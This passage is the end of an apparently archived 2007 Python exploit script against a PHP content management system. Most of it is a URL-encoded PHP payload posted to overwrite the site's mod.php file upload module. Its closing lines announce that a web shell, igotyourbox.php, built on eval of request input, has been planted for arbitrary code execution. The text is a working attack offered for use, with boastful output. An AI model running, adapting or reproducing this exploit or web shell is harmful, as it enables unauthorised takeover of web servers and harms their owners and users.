3E%3Cbr+%2F%3E%0A%0A%3Cdiv+align%3D%22center%22%3E%3Cinput+type%3D%22submit%22+value%3D%22Upload%22+%2F%3E+%3Cinput+type%3D%22reset%22+value%3D%22Reset%22+%2F%3E%3C%2Fdiv%3E%0A%0A%3C%2Fform%3E%3Cbr+%2F%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22_upload%22)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+align%3D%22center%22+%24sp_htd%3EFS%3A+Upload%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0AHTML%3B%0A%0Aif(%24ls+%3D%3D+%24login_session)+%7B%0A%0A%24err+%3D+0%3B%0A%0A%24id+%3D+make_code(50)%3B%0A%0A%24product+%3D+alter(%24_POST%5B'product'%5D)%3B%0A%0A%24publisher+%3D+alter(%24_POST%5B'publisher'%5D)%3B%0A%0A%24category+%3D+alter(%24_POST%5B'category'%5D)%3B%0A%0A%24product_website+%3D+alter(%24_POST%5B'product_website'%5D)%3B%0A%0A%24description+%3D+alter(%24_POST%5B'description'%5D)%3B%0A%0A%24ext+%3D+substr(strrchr(%24_FILES%5B'upload'%5D%5B'name'%5D%2C%22.%22)%2C1)%3B%0A%0Aif(blankc(%24_FILES%5B'upload'%5D%5B'name'%5D%2C%22Upload%22))+%7B+%24err+%3D+1%3B+%7D%0A%0Aif(blankc(%24product%2C%22Product%22))+%7B+%24err+%3D+1%3B+%7D%0A%0Aif(blankc(%24category%2C%22Category%22))+%7B+%24err+%3D+1%3B+%7D%0A%0Aif(blankc(%24description%2C%22Description%22))+%7B+%24err+%3D+1%3B+%7D%0A%0Aif(%24_FILES%5B'upload'%5D%5B'size'%5D+%3E+FS_MAX_SIZE)+%7B+derr(%22File+is+too+large.+Limit%3A+%22.%24fs_max_size)%3B+%24err+%3D+1%3B+%7D%0A%0Aif(%24fs_ext_allow+!%3D+%22%22)+%7B%0A%0A%24arr+%3D+explode(%22%2C%22%2C%24fs_ext_allow)%3B%0A%0A%24err+%3D+1%3B%0A%0Aforeach(%24arr+as+%24single)+%7B%0A%0Aif(strtolower(%24ext)+%3D%3D+strtolower(%24single))+%7B+%24err+%3D+0%3B+%7D%0A%0A%7D%0A%0Aif(%24err+%3D%3D+1)+%7B+derr(%22File+extension+(%24ext)+is+not+allowed.+Extensions+allowed+are%3A+%22.str_replace(%22%2C%22%2C%22%2C+%22%2C%24fs_ext_allow))%3B++%7D%0A%0A%7D%0A%0Aelse+%7B%0A%0A%24arr+%3D+explode(%22%2C%22%2C%24fs_ext_unallow)%3B%0A%0Aforeach(%24arr+as+%24single)+%7B%0A%0Aif(strtolower(%24ext)+%3D%3D+strtolower(%24single))+%7B+derr(%22File+extension+(%24single)+is+not+allowed.%22)%3B+%24err+%3D+1%3B+%7D%0A%0A%7D%0A%0A%7D%0A%0Aif(%24err+%3D%3D+0)+%7B%0A%0Aif(move_uploaded_file(%24_FILES%5B'upload'%5D%5B'tmp_name'%5D%2C%24mod_root.%22%2Fuploads%2F%22.%24id))+%7B%0A%0A%24fs_files+%3D+%22%22%3B%0A%0Arequire(%24root.%22%2Fusers%2F%22.strtolower(%24usr).%22.php%22)%3B%0A%0A%24fs_files+.%3D+%22%7C%7C%22+.+%24id%3B%0A%0A%24name+%3D+basename(%24_FILES%5B'upload'%5D%5B'name'%5D)%3B%0A%0A%24author+%3D+%24usr%3B%0A%0A%24date_posted+%3D+%24date%3B%0A%0A%24downloads+%3D+0%3B%0A%0A%24rating+%3D+0%3B%0A%0Aif(%24u_rank+%3E%3D+%24rank_required%5B'mod_admin'%5D)+%7B%0A%0A%24access+%3D+alter(%24_POST%5B'access'%5D)%3B%0A%0A%7D%0A%0Aelse+%7B%0A%0A%24access+%3D+0%3B%0A%0A%7D%0A%0Adefine('FS_WRITE'%2C%22edit%22)%3B%0A%0Arequire(%24mod_root.%22%2Ffs_file.php%22)%3B%0A%0Awf(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22%2C%22w%22%2C%24fs_file)%3B%0A%0Arequire(%24root.%22%2Fuser_info.php%22)%3B%0A%0Awf(%24root.%22%2Fusers%2F%22.strtolower(%24usr).%22.php%22%2C%22w%22%2C%24user_info)%3B%0A%0Aecho+%3C%3C%3CHTML%0A%0AFile+successfully+uploaded.%3Cbr+%2F%3E%0A%0A%3Cdiv+align%3D%22center%22%3E%0A%0A(%3Ca+href%3D%22%24mod_url%26do%3Dview%26id%3D%24id%22%3EView+File%3C%2Fa%3E)%3Cbr+%2F%3E%0A%0A(%3Ca+href%3D%22%24mod_url%26do%3Dmanage%22%3EManage+Uploads%3C%2Fa%3E)%3Cbr+%2F%3E%0A%0A(%3Ca+href%3D%22%24mod_url%26do%3Dupload%22%3EUpload+Another+File%3C%2Fa%3E)%3Cbr+%2F%3E%0A%0A%3C%2Fdiv%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aelse+%7B+derr(%22Failed+to+upload+file.%22)%3B+%7D%0A%0A%7D%0A%0A%7D%0A%0Aelse+%7B+derr(%22Bad+session.%22)%3B+%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22delete_upload%22)+%7B%0A%0Aif(%24ls+%3D%3D+%24login_session)+%7B%0A%0Aif(file_exists(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22))+%7B%0A%0Arequire(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22)%3B%0A%0Aif(strtolower(%24usr)+%3D%3D+strtolower(%24fs_author))+%7B%0A%0Aunlink(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22)%3B%0A%0Aunlink(%24mod_root.%22%2Fuploads%2F%22.%24id)%3B%0A%0Arequire(%24root.%22%2Fusers%2F%22.strtolower(%24usr).%22.php%22)%3B%0A%0A%24fs_files+%3D+str_replace(%22%7C%7C%22.%24id%2C%22%22%2C%24fs_files)%3B%0A%0Arequire(%24root.%22%2Fuser_info.php%22)%3B%0A%0Awf(%24root.%22%2Fusers%2F%22.strtolower(%24usr).%22.php%22%2C%22w%22%2C%24user_info)%3B%0A%0A%7D%0A%0A%7D%0A%0A%24do+%3D+%22manage%22%3B%0A%0A%7D%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22edit_upload%22)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+align%3D%22center%22+%24sp_htd%3EEdit+Upload%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0AThis+feature+is+still+under+development.%3Cbr+%2F%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22manage%22)+%7B%0A%0Arequire(%24root.%22%2Fusers%2F%22.strtolower(%24usr).%22.php%22)%3B%0A%0Aif(%24fs_files+%3D%3D+%22%22)+%7B%0A%0A%24uploaded_files+%3D+0%3B%0A%0A%7D%0A%0Aelse+%7B%0A%0A%24uploaded_files+%3D+count(explode(%22%7C%7C%22%2C%24fs_files))+-+1%3B%0A%0A%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+align%3D%22center%22+%24sp_htd%3EStats%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0A%24uploaded_files+uploaded+files.%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%3Cbr+%2F%3E%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+colspan%3D%226%22+align%3D%22center%22+%24sp_htd%3EUploaded+Files%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+width%3D%2240%25%22+%24sp_htd%3EName%3C%2Ftd%3E%3Ctd+width%3D%2220%25%22+%24sp_htd%3EDate+Added%3C%2Ftd%3E%3Ctd+width%3D%2215%25%22+%24sp_htd%3ERating%3C%2Ftd%3E%3Ctd+width%3D%2215%25%22+%24sp_htd%3EDownloads%3C%2Ftd%3E%3Ctd+width%3D%2220%25%22+%24sp_htd%3ESize%3C%2Ftd%3E%3Ctd+width%3D%2210%25%22+%24sp_htd%3EAction%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%24arr+%3D+explode(%22%7C%7C%22%2C%24fs_files)%3B%0A%0A%24x+%3D+0%3B%0A%0Aforeach(%24arr+as+%24single)+%7B%0A%0Aif(%24single+!%3D+%22%22)+%7B%0A%0Aif(file_exists(%24mod_root.%22%2Ffiles%2F%22.%24single.%22.php%22))+%7B%0A%0Arequire(%24mod_root.%22%2Ffiles%2F%22.%24single.%22.php%22)%3B%0A%0A%24fs_size+%3D+filesize(%24mod_root.%22%2Ffiles%2F%22.%24single.%22.php%22)%3B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Ca+href%3D%22%24mod_url%26do%3Dview%26id%3D%24single%22%3E%24fs_product+(%24fs_name)%3C%2Fa%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_date%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_rating%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_downloads%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_size%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%3Ca+href%3D%22%24mod_url%26do%3Dedit_upload%26id%3D%24single%22+alt%3D%22Edit%22%3E%5BE%5D%3C%2Fa%3E+%3Ca+href%3D%22%24mod_url%26do%3Ddelete_upload%26id%3D%24single%26ls%3D%24login_session%22+alt%3D%22Delete%22%3E%5BX%5D%3C%2Fa%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%24x%2B%2B%3B%0A%0A%7D%0A%0A%7D%0A%0A%7D%0A%0Aif(%24x+%3D%3D+0)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+colspan%3D%226%22+align%3D%22center%22+%24sp_ctd%3ENo+files+uploaded.%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+colspan%3D%226%22+align%3D%22right%22+%24sp_ctd%3E%3Ca+href%3D%22%24mod_url%26do%3Dupload%22%3EUpload+File%3C%2Fa%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0A%7D%0A%0A%3F%3E\")); fclose($r0x);die;"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded"})
response = conn.getresponse()
print "[+]Repairing mod.php... -->",response.status, response.reason
conn.close()
print "[+]Done."

print "[+]Success :D Exploited.\n\n A PHP Page Has Been Created -> %s%sigotyourbox.php \n With Content:\n <?php eval(stripslashes($_REQUEST[dox])); ?>\n Execute your php codes :P Have Fun :D\n\n-= Paradox Got This One :D =-\n" % (target,path)

# milw0rm.com [2007-12-21]